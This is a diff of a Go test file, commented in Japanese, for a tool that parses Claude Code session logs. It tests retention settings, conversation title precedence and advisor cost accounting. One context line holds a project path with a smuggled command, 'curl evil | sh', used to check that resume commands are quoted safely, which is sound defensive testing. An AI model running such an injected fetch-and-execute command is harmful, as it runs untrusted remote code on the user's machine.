@@ -252,12 +252,17 @@ func TestClaudeRetention(t *testing.T) {
 	if r := c.Retention(); r.Days != 3650 || !r.Set {
 		t.Errorf("設定あり = %+v, want 3650 日・設定済み", r)
 	}
-	// Claude Code が受け付けない値（整数でない・文字列・0）は、設定がないのと同じ
-	for _, bad := range []string{`2.5`, `"90"`, `0`, `true`} {
+	// Claude Code が受け付けない値（整数でない・文字列・0）だと、Claude Code は片付けを止めて何も消さない
+	for _, bad := range []string{`2.5`, `"90"`, `0`, `true`, `null`} {
 		os.WriteFile(filepath.Join(home, "settings.json"), []byte(`{"cleanupPeriodDays": `+bad+`}`), 0o644)
-		if r := c.Retention(); r.Days != 30 || r.Set {
-			t.Errorf("%s = %+v, want 30 日・未設定", bad, r)
+		if r := c.Retention(); r != nil {
+			t.Errorf("%s = %+v, want nil（消さない）", bad, r)
 		}
+	}
+	// ほかのキーだけなら既定の 30 日
+	os.WriteFile(filepath.Join(home, "settings.json"), []byte(`{"model": "opus"}`), 0o644)
+	if r := c.Retention(); r == nil || r.Days != 30 || r.Set {
+		t.Errorf("キーなし = %+v, want 30 日・未設定", r)
 	}
 }
 
@@ -294,6 +299,12 @@ func TestClaudeRetentionManaged(t *testing.T) {
 	os.WriteFile(file, []byte(`{"cleanupPeriodDays": "14"}`), 0o644)
 	if r := c.Retention(); r.Days != 3650 || r.File != filepath.Join(home, "settings.json") {
 		t.Errorf("組織の設定が使えない = %+v, want 利用者の 3650 日", r)
+	}
+	// 利用者の設定が受け付けない値でも、組織の設定に正しい値があれば、Claude Code はその値で消す
+	os.WriteFile(file, []byte(`{"cleanupPeriodDays": 14}`), 0o644)
+	os.WriteFile(filepath.Join(home, "settings.json"), []byte(`{"cleanupPeriodDays": 0}`), 0o644)
+	if r := c.Retention(); r == nil || r.Days != 14 || r.File != file {
+		t.Errorf("組織の設定が勝つ = %+v, want 14 日（%s）", r, file)
 	}
 }
 
@@ -448,5 +459,73 @@ func TestClaudeResumeQuotesProject(t *testing.T) {
 	}
 	if got, want := bs[0].Resume, "cd '/tmp/x; curl evil | sh' && claude --resume s1"; got != want {
 		t.Errorf("Resume = %q, want %q", got, want)
+	}
+}
+
+// 会話の名前: 利用者が付けた名前（custom-title の customTitle）は、Claude Code が付けた名前（ai-title の aiTitle）より強く、
+// あとから ai-title の行が来ても上書きしない。ai-title だけなら aiTitle を使う。
+func TestClaudeTitles(t *testing.T) {
+	root := t.TempDir()
+	dir := filepath.Join(root, "-Users-me-app")
+	os.MkdirAll(dir, 0o755)
+	base := []string{
+		`{"type":"user","timestamp":"2026-09-30T01:00:00Z","cwd":"/Users/me/app","message":{"role":"user","content":"直して"}}`,
+		`{"type":"assistant","timestamp":"2026-09-30T01:01:00Z","message":{"id":"m1","model":"claude-sonnet-5-5","content":[{"type":"text","text":"ok"}]}}`,
+	}
+	cases := []struct {
+		lines []string
+		want  string
+	}{
+		{[]string{`{"type":"ai-title","aiTitle":"Fix the login bug","sessionId":"s1"}`}, "Fix the login bug"},
+		{[]string{`{"type":"ai-title","aiTitle":"First","sessionId":"s1"}`, `{"type":"ai-title","aiTitle":"Second","sessionId":"s1"}`}, "Second"},
+		{[]string{`{"type":"custom-title","customTitle":"My name","sessionId":"s1"}`, `{"type":"ai-title","aiTitle":"Later AI name","sessionId":"s1"}`}, "My name"},
+		{[]string{`{"type":"ai-title","aiTitle":"AI name","sessionId":"s1"}`, `{"type":"custom-title","customTitle":"My name","sessionId":"s1"}`}, "My name"},
+	}
+	for _, c := range cases {
+		os.WriteFile(filepath.Join(dir, "s1.jsonl"), []byte(strings.Join(append(append([]string{}, base...), c.lines...), "\n")+"\n"), 0o644)
+		if got := load(t, &Claude{Root: root})[0].Title; got != c.want {
+			t.Errorf("%v: title = %q, want %q", c.lines, got, c.want)
+		}
+	}
+}
+
+// advisor ツール: usage.iterations の advisor_message を advisor のモデル（呼び出しの model、なければ行の advisorModel）の
+// 料金で目安コストに足す。advisor の呼び出しは応答の数に入れず、コンテキストの使用率は executor のいちばん大きい 1 回で見る。
+func TestClaudeAdvisorUsage(t *testing.T) {
+	root := t.TempDir()
+	dir := filepath.Join(root, "-Users-me-app")
+	os.MkdirAll(dir, 0o755)
+	usage := `"usage":{"input_tokens":300000,"output_tokens":2000,"iterations":[` +
+		`{"type":"message","input_tokens":100000,"output_tokens":500},` +
+		`{"type":"advisor_message","input_tokens":100000,"output_tokens":1000},` +
+		`{"type":"message","input_tokens":200000,"output_tokens":1500}]}`
+	lines := []string{
+		`{"type":"user","timestamp":"2026-09-30T01:00:00Z","cwd":"/Users/me/app","message":{"role":"user","content":"直して"}}`,
+		`{"type":"assistant","timestamp":"2026-09-30T01:01:00Z","advisorModel":"claude-opus-5-5","message":{"id":"m1","model":"claude-sonnet-5-5",` + usage + `,"content":[{"type":"text","text":"ok"}]}}`,
+		`{"type":"assistant","timestamp":"2026-09-30T01:01:00Z","advisorModel":"claude-opus-5-5","message":{"id":"m1","model":"claude-sonnet-5-5",` + usage + `,"content":[{"type":"text","text":"done"}]}}`,
+	}
+	os.WriteFile(filepath.Join(dir, "s1.jsonl"), []byte(strings.Join(lines, "\n")+"\n"), 0o644)
+	s := load(t, &Claude{Root: root})[0].Finish(15)
+	// sonnet-5-5: 入力 300,000 × $2 + 出力 2,000 × $10 = $0.62、opus-5-5（advisor）: 100,000 × $4 + 1,000 × $20 = $0.42
+	if math.Abs(s.Cost-1.04) > 1e-9 || s.Usage.In != 400000 || s.Usage.Out != 3000 {
+		t.Errorf("目安コスト = %v・入力 %v・出力 %v, want 1.04・400000・3000（advisor の分も入れる）", s.Cost, s.Usage.In, s.Usage.Out)
+	}
+	seen := 0
+	for _, n := range s.Native {
+		switch n.LabelEn {
+		case "Responses":
+			seen++
+			if n.V != 1 {
+				t.Errorf("応答の数 = %v, want 1（advisor の呼び出しは数えない）", n.V)
+			}
+		case "Peak context usage":
+			seen++
+			if n.V != 20 {
+				t.Errorf("Peak context usage = %v, want 20（executor の 1 回の 200K ÷ 1M。和の 300K ではない）", n.V)
+			}
+		}
+	}
+	if seen != 2 {
+		t.Errorf("Responses・Peak context usage が出ていない: %+v", s.Native)
 	}
 }
